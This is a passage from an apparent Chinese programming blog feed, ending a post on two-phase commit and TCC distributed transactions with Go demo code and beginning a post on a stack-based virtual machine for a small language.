&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">TransferReq&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindJSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">tmcli&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewTMClient&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://tm:5000&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">gid&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGenGID&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">CreateGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CreateGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GeneralResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;create global transaction failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">cli1&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewBankClient&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://bank1:5000&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">transInResp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">cli1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">TransIn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TransInReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ToID&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Amount&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Amount&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 失败的话就等着超时
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RollbackGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GeneralResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;trans in failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">transInResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 失败的话就等着超时
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RollbackGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GeneralResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;trans in failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">cli2&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewBankClient&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://bank2:5000&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">transOutResp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">cli2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">TransOut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TransOutReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ToID&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Amount&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Amount&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 失败的话就等着超时
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RollbackGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GeneralResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;trans out failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">transOutResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 失败的话就等着超时
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RollbackGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GeneralResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;trans out failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">commitResp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">CommitGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CommitGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 失败的话就等着超时
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RollbackGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GeneralResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;commit failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">commitResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 失败的话就等着超时
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">tmcli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RollbackGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GeneralResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;commit failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{}{&lt;/span>
&lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;message&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;ok&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>AP代码主要就是调各个RM，发起转入/转出操作，以及在出现问题的情况下回滚全局事务。&lt;/p>
&lt;p>当然，AP回滚全局事务也会出现网络分区的情况，AP崩溃或者网络故障而无法连接TM，也就无法告诉TM是不是所有参与者都准备就绪，TM只能自己等超时后去回调参与者，让参与者回滚所有本地事务。&lt;/p>
&lt;p>这里和参与者出现分区又不大一样，AP出现分区最多是导致原本该提交的事务被回滚，并不会破坏一致性，也就满足了CP。但事务被回滚，等于是失去了可用性，不满足CAP中的A。&lt;/p>
&lt;h2 id="8-关于tcc">#8 关于TCC&lt;/h2>
&lt;p>TCC 是 Try-Confirm-Cancel 的缩写，最早是由 Pat Helland 于 2007 年发表的一篇名为《Life beyond Distributed Transactions:an Apostate’s Opinion》的论文提出。这里只讲一下个人理解，因为 TCC 的时序图和 XA 可以说是一模一样。&lt;/p>
&lt;p>TCC 也是一种 2 阶段提交的协议，和 XA 模型的主要区别是本地事务的准备和提交是业务层面上做的接口，业务上可控性更好的同时，也要求对服务接口进行大刀阔斧的修改，开发量会大很多。TCC 也可以用数据库的 XA 实现。&lt;/p>
&lt;p>TCC 的一个重要优点是可以减少数据库资源锁定，比如说，采用 TCC 方式开发一个添加账单的接口，Try 阶段可以直接 INSERT 一个隐藏的账单，Confirm 阶段把账单设置为可见，Cancel 阶段则删除。如果因为某些原因，很长时间没有进入 Confirm 阶段，TCC 服务也不会有什么影响。而 XA 方式一方面要数据库支持，一方面数据库要维持锁，消耗会更大。&lt;/p>
&lt;h2 id="9-分布式事务问题">#9 分布式事务问题&lt;/h2>
&lt;p>分布式事务需要服务在接口做好一定的保护措施，遵循一定的编程规范，来避免错误发生。&lt;/p>
&lt;h3 id="空补偿">空补偿&lt;/h3>
&lt;p>空补偿问题，指的是服务因为一些原因没有收到 PREPARE 请求，在 TM 发起了回滚操作时收到了 ROLLBACK 请求。此时服务并没有需要回滚的本地事务，也就是空补偿（或者叫空回滚）。&lt;/p>
&lt;p>如果服务没有处理空补偿，返回了错误，TM就会认为服务没有回滚成功进而不断重试。&lt;/p>
&lt;h3 id="防悬挂">防悬挂&lt;/h3>
&lt;p>事务悬挂问题，指的是因为网络拥塞等原因，PREPARE 请求晚于 ROLLBACK 请求到来的情况。此时服务已经做了空补偿，全局事务被回滚，迟到的 PREPARE 请求不对应任何全局事务，也就是“垂悬的”。&lt;/p>
&lt;p>关于垂悬这个术语，是从 &lt;code>dangling (dangle的进行时)&lt;/code> 翻译而来。比如垂悬指针 &lt;em>dangling pointer&lt;/em> 指的是已经被指向已经被释放的空间的指针，垂悬事务对应的就是指向已经被回滚的全局事务的本地事务。&lt;/p>
&lt;p>对于全局事务已经被回滚的情况，服务应该不执行 PREPARE，超时到 TM 都回滚了，大概也没法返回错误，客户端连接都可能断开了。&lt;/p>
&lt;h3 id="幂等">幂等&lt;/h3>
&lt;p>因为网络延迟和抖动的存在，服务可能会收到多次 PREPARE/COMMIT/ROLLBACK 。对这种情况也要保证同样的条件下，一次请求和多次请求产生的结果是一致的。&lt;/p>
&lt;p>换言之，同样的参数PREPARE多次，和一次 PREPARE 一致。多余的 PREPARE 可以啥也不做。同样的 COMMIT/ROLLBACK 多次，也是等于只 COMMIT/ROLLBACK 一次。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>主要研究了2阶段提交的主要过程、接口设计、TM实现以及2阶段提交协议中可能遇到的一些问题。代码主要是辅助思考，并没有真正的成果。&lt;/p>
&lt;p>2阶段提交过程：&lt;/p>
&lt;ul>
&lt;li>prepare&lt;/li>
&lt;li>commit/rollback&lt;/li>
&lt;/ul>
&lt;p>2阶段提交的基本时序：&lt;/p>
&lt;ul>
&lt;li>注册全局事务&lt;/li>
&lt;li>注册本地事务（prepare）
&lt;ul>
&lt;li>如果失败，则回滚全局事务&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>提交全局事务&lt;/li>
&lt;/ul>
&lt;p>全局事务的提交和回滚都不允许部分失败的情况，一旦PREPARE成功，提交或回滚都必须成功。如果出现临时失败（网络问题或者崩溃），则不断重试直到全部成功。&lt;/p>
&lt;p>分布式事务常见问题：&lt;/p>
&lt;ul>
&lt;li>空补偿问题。出现在没有 PREPARE 就调用了 ROLLBACK 的情况。需要支持。&lt;/li>
&lt;li>垂悬问题。出现在先调用了 ROLLBACK 才调用 PREPARE 的情况。不进行 PREPARE。&lt;/li>
&lt;li>幂等问题。出现在以同样的条件多次调用 PREPARE/COMMIT/ROLLBACK 的情况。多次调用应和一次调用结果一致。&lt;/li>
&lt;/ul>
&lt;p>之后可能再研究下分布式事务问题的具体实践，或者实现下 TCC 之类其他的分布式事务模型。&lt;/p>
&lt;p>最终代码在 &lt;a class="link" href="https://github.com/nnnewb/dt" target="_blank" rel="noopener"
>github.com/nnnewb/dt&lt;/a>&lt;/p></description></item><item><title>基于栈的虚拟机</title><link>https://nnnewb.github.io/blog/p/stack-based-virtual-machine-for-minilang/</link><pubDate>Mon, 13 Dec 2021 16:20:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/stack-based-virtual-machine-for-minilang/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>之前写了个s表达式求值器，很简陋，直接在抽象语法树上执行。只是这样的话其实还没啥意思，所以再试试改进成在基于栈的虚拟机上执行。&lt;/p>
&lt;h2 id="0x01-虚拟机模型">0x01 虚拟机模型&lt;/h2>
&lt;p>首先得承认对这些语言层级的虚拟机不熟，基本是随便设计的。&lt;/p>
&lt;h3 id="对象模型">对象模型&lt;/h3>
&lt;p>虚拟机指令操作的目标是 &lt;strong>对象&lt;/strong> ，包括内建的对象和用户定义的对象，虚拟机指令操作的基本单位也是对象。&lt;/p>
&lt;p>目前关注的是内建的对象，简单抽象出了几个基本类型。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">Object&lt;/span> &lt;span class="kd">interface&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">TypeName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">UInt&lt;/span> &lt;span class="kt">uint64&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">UInt&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">TypeName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;UInt&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">Float&lt;/span> &lt;span class="kt">float64&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="nx">Float&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">TypeName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;Float&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">Boolean&lt;/span> &lt;span class="kt">bool&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span> &lt;span class="nx">Boolean&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">TypeName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;boolean&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">String&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">String&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">TypeName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;string&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">Symbol&lt;/span> &lt;span class="kt">string&lt;/span>
